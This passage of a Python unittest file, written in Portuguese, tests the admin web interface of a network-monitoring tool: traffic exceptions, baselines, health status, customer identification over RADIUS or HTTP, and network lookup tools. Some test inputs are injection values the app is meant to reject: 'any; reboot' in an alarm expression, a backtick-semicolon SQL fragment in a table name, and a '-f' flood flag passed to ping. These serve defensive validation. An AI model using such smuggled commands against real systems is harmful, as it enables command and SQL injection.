        r = self.post("/alarmes/nova", action="salvar", **dict(form, expr="any; reboot"))
        self.assertNotIn(3, self.db.alarm_rules)


    def test_exceptions_page(self):
        self.login()
        self.assertEqual(self.c.get("/excecoes").status_code, 200)
        r = self.post("/excecoes", kind="cidr", value="187.87.201.53", side="local", direction="out",
                      rule_name="", action="ignore", factor="1", note="DNS recursivo", days="")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(self.db.excs[0]["value"], "187.87.201.53/32")
        self.assertEqual(self.db.audits[-1][1], "excecao_salva")
        r = self.post("/excecoes", action="preset", asn="15169", direction="in", rule_name="")
        self.assertEqual(self.db.excs[1]["kind"], "asn")
        self.assertEqual(self.db.synced_ids, (2,))                      # prefixos buscados na hora
        r = self.post("/excecoes", kind="cidr", value="0.0.0.0/0", side="remote", direction="any", rule_name="",
                      action="ignore", factor="1", note="", days="")
        self.assertEqual(len(self.db.excs), 2)
        r = self.post("/excecoes", kind="cidr", value="45.238.170.70", side="remote", direction="any",
                      rule_name="", action="multiply", factor="3", note="", days="")
        self.assertEqual(len(self.db.excs), 2)                          # multiplicador so do lado local
        r = self.post("/excecoes", kind="cidr", value="45.238.170.70", side="local", direction="in",
                      rule_name="Regra que nao existe", action="ignore", factor="1", note="", days="")
        self.assertEqual(len(self.db.excs), 2)
        page = self.c.get("/excecoes")
        self.assertIn(b"187.87.201.53/32", page.data)
        self.assertIn(b"AS15169", page.data)
        page = self.c.get("/excecoes?kind=cidr&value=45.238.170.70&side=local&action=multiply")
        self.assertIn(b'value="45.238.170.70"', page.data)
        self.post("/excecoes", action="excluir", id="1")
        self.assertEqual([e["id"] for e in self.db.excs], [2])
        self.assertEqual(self.db.audits[-1][1], "excecao_excluida")

    def test_baseline_page(self):
        self.login()
        page = self.c.get("/base")
        self.assertEqual(page.status_code, 200, page.data[:300])
        self.assertIn(b"Linha de base", page.data)
        r = self.post("/base", enabled="1", factor="2,5", floor_pct="20", min_days="3", timezone="America/Bahia")
        self.assertEqual(r.status_code, 302)
        page = self.c.get("/base")
        self.assertIn(b'value="2.5"', page.data)
        self.assertIn(b"America/Bahia", page.data)
        r = self.post("/base", enabled="1", factor="50", floor_pct="20", min_days="3", timezone="America/Bahia")
        self.assertIn("Não salvo".encode(), self.c.get("/base").data)


    def test_health_page(self):
        self.login()
        page = self.c.get("/saude")
        self.assertIn(b"setup-health.sh", page.data)
        now = datetime.now(timezone.utc).replace(tzinfo=None).replace(microsecond=0)
        self.db.health_rows = [{"key": "nfcapd", "label": "Coleta NetStream (nfcapd)", "status": "crit",
                                "value": "último arquivo há 12 min", "detail": "o roteador parou", "since": now,
                                "updated_at": now}]
        page = self.c.get("/saude")
        self.assertIn("crítico".encode(), page.data)
        self.assertIn("último arquivo há 12 min".encode(), page.data)
        self.assertNotIn(b"parado?", page.data)
        self.db.health_rows[0]["updated_at"] = now - timedelta(minutes=30)
        self.assertIn(b"parado?", self.c.get("/saude").data)


    def test_customers_and_radius(self):
        from fmn_filters.admin.config_store import read_env
        self.login()
        self.assertEqual(self.c.get("/clientes").status_code, 200)
        r = self.post("/clientes", action="salvar", id="", name="Padaria Central", code="C-9",
                      prefixes="187.87.201.40/30\n187.87.201.50", contact="noc@padaria.example", note="")
        self.assertEqual(r.status_code, 302)
        self.assertEqual(self.db.custs[1]["prefixes"], ["187.87.201.40/30", "187.87.201.50/32"])
        self.assertEqual(self.db.audits[-1][1], "cliente_salvo")
        r = self.post("/clientes", action="salvar", id="", name="Padaria Central", prefixes="187.87.201.60")
        self.assertIn("já existe".encode(), r.data)
        self.assertIn(b'value="Padaria Central"', r.data)                   # formulario preservado
        r = self.post("/clientes", action="salvar", id="", name="Ruim", prefixes="10.0.0.0/8")
        self.assertEqual(len(self.db.custs), 1)
        self.assertIn(b"Padaria Central", self.c.get("/clientes?edit=1").data)
        r = self.post("/clientes", action="radius", RADIUS_DB_HOST="10.0.0.5", RADIUS_DB_PORT="3306",
                      RADIUS_DB_NAME="radius", RADIUS_TABLE="radacct", RADIUS_DB_USER="orby",
                      RADIUS_DB_PASSWORD="s3cr3t-radius", RADIUS_TZ="America/Bahia")
        self.assertEqual(r.status_code, 302)
        path = Path(self.env["ORBYMON_RADIUS_ENV"])
        self.assertEqual(read_env(path)["RADIUS_DB_PASSWORD"], "s3cr3t-radius")
        page = self.c.get("/clientes")
        self.assertNotIn(b"s3cr3t-radius", page.data)                       # senha nunca volta para a pagina
        self.assertIn("mantida".encode(), page.data)
        self.assertNotIn(b"s3cr3t", self.db.audits[-1][2].encode())
        self.post("/clientes", action="radius", RADIUS_DB_HOST="10.0.0.6", RADIUS_DB_PORT="3306",
                  RADIUS_DB_NAME="radius", RADIUS_TABLE="radacct", RADIUS_DB_USER="orby", RADIUS_DB_PASSWORD="",
                  RADIUS_TZ="America/Bahia")
        self.assertEqual(read_env(path)["RADIUS_DB_PASSWORD"], "s3cr3t-radius")   # vazio = manter
        self.post("/clientes", action="radius", RADIUS_DB_HOST="10.0.0.6", RADIUS_DB_NAME="radius",
                  RADIUS_TABLE="radacct`;x", RADIUS_DB_USER="orby")
        self.assertEqual(read_env(path)["RADIUS_TABLE"], "radacct")
        self.post("/clientes", action="excluir", id="1")
        self.assertEqual(self.db.custs, {})


    def test_tools_page(self):
        from fmn_filters import tools as tl
        self.login()
        self.assertEqual(self.c.get("/ferramentas").status_code, 200)
        with mock.patch.object(tl, "rdap_ip", return_value={"ip": "203.0.113.9", "nome": "EXEMPLO-NET", "handle": "",
                                                            "pais": "US", "faixa": "a - b", "cidrs": [],
                                                            "abuse": ["abuse@exemplo.net"], "contatos": []}):
            r = self.post("/ferramentas", tool="rdap", q="203.0.113.9")
        self.assertIn(b"abuse@exemplo.net", r.data)
        self.assertEqual(self.db.audits[-1][1:], ("ferramenta", "rdap 203.0.113.9"))
        with mock.patch.object(tl, "_run", return_value="64 bytes from 203.0.113.9"):
            r = self.post("/ferramentas", tool="ping", q="203.0.113.9")
        self.assertIn(b"64 bytes from", r.data)
        r = self.post("/ferramentas", tool="ping", q="-f 1.1.1.1")
        self.assertIn("válido".encode(), r.data)
        with mock.patch.object(tl, "asn_info", side_effect=OSError("sem rede")):
            r = self.post("/ferramentas", tool="asn", q="AS262687")
        self.assertIn(b"consulta falhou: sem rede", r.data)


    def test_identification_via_api(self):
        from fmn_filters import customers as cu
        from fmn_filters.admin.config_store import read_env
        self.login()
        form = dict(action="radius", RADIUS_MODE="http", RADIUS_TZ="America/Bahia",
                    RADIUS_HTTP_URL="https://erp.exemplo/api/conexoes?ip={ip}", RADIUS_HTTP_METHOD="GET",
                    http_headers="Authorization: Bearer token-secreto-123", http_body="",
                    RADIUS_HTTP_LIST="registros", RADIUS_HTTP_LOGIN="login", RADIUS_HTTP_START="inicio",
                    RADIUS_HTTP_STOP="fim", RADIUS_HTTP_MAC="", sql_text="")
        self.assertEqual(self.post("/clientes", **form).status_code, 302)
        env = read_env(Path(self.env["ORBYMON_RADIUS_ENV"]))
        self.assertEqual(cu.b64d(env["RADIUS_HTTP_HEADERS_B64"]), "Authorization: Bearer token-secreto-123")
        page = self.c.get("/clientes")
        self.assertNotIn(b"token-secreto-123", page.data)
        self.assertIn("configurados; vazio = manter".encode(), page.data)
        self.assertNotIn(b"token-secreto", self.db.audits[-1][2].encode())
        self.post("/clientes", **dict(form, http_headers="", RADIUS_HTTP_LOGIN="usuario"))
        env = read_env(Path(self.env["ORBYMON_RADIUS_ENV"]))
        self.assertEqual(cu.b64d(env["RADIUS_HTTP_HEADERS_B64"]), "Authorization: Bearer token-secreto-123")
        self.assertEqual(env["RADIUS_HTTP_LOGIN"], "usuario")

        class Resp:
            def read(self, n=-1):
                return b'{"registros": [{"usuario": "joao123", "inicio": "2026-11-01 08:30:00", "fim": null}]}'

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False
        with mock.patch("urllib.request.urlopen", return_value=Resp()) as op:
            r = self.post("/clientes", **dict(form, action="testar_fonte", http_headers="", RADIUS_HTTP_LOGIN="usuario",
                                              test_ip="100.64.70.12", test_when="2026-11-01 12:00"))
        self.assertIn(b"joao123", r.data)
        self.assertIn("Resposta crua".encode(), r.data)
        self.assertEqual(op.call_args[0][0].get_header("Authorization"), "Bearer token-secreto-123")
        self.assertEqual(self.db.audits[-1][1], "identificacao_teste")
        r = self.post("/clientes", **dict(form, RADIUS_HTTP_URL="https://erp.exemplo/sem-ip"))
        self.assertIn(b"https://erp.exemplo/sem-ip", r.data)                # formulario mantido no erro


class CliTests(unittest.TestCase):
    def test_create_user(self):
        from fmn_filters.admin import cli
        db = FakeStore()
        with mock.patch.object(cli.getpass, "getpass", return_value="uma-senha-boa-1"):
            self.assertEqual(cli.main(["create-user", "Admin"], store=db), 0)
        user = db.user(username="admin")
        self.assertTrue(security.verify_password("uma-senha-boa-1", user["pw_hash"]))
        self.assertEqual(cli.main(["create-user", "admin"], store=db), 1)
        self.assertEqual(cli.main(["reset-2fa", "admin"], store=db), 0)


@unittest.skipUnless(os.geteuid() == 0, "precisa de root para testar dono do arquivo")
class RetentionScriptTests(unittest.TestCase):
    def test_archive_conf_must_be_root_only(self):
        with tempfile.TemporaryDirectory() as d:
            d = Path(d)
            for sub in ("nat", "spool", "flow"):
                (d / sub).mkdir()
            old = d / "nat" / "nat-events-2026010101.tsv.gz"
            old.write_text("x")
            past = time.time() - 20 * 86400
            os.utime(old, (past, past))
            (d / "r.env").write_text("ORBYMON_LOG_RETENTION_DAYS='7'\n")
            conf = d / "a.conf"
            conf.write_text("ORBYMON_ARCHIVE_CMD=echo ARQ {}\n")
            env = dict(os.environ, ORBYMON_RETENTION_ENV=str(d / "r.env"), ORBYMON_ARCHIVE_CONF=str(conf),
                       ORBYMON_NAT_DIR=str(d / "nat"), ORBYMON_SPOOL_DIR=str(d / "spool"),
                       ORBYMON_FLOW_DIR=str(d / "flow"))
            os.chmod(conf, 0o666)
            out = subprocess.run(["bash", str(ROOT / "scripts" / "orbymon-retention.sh")], env=env,
                                 capture_output=True, text=True)
            self.assertIn("IGNORADO", out.stderr)
            self.assertNotIn("ARQ", out.stdout)
            self.assertFalse(old.exists())          # apagou sem arquivar


if __name__ == "__main__":
    unittest.main()
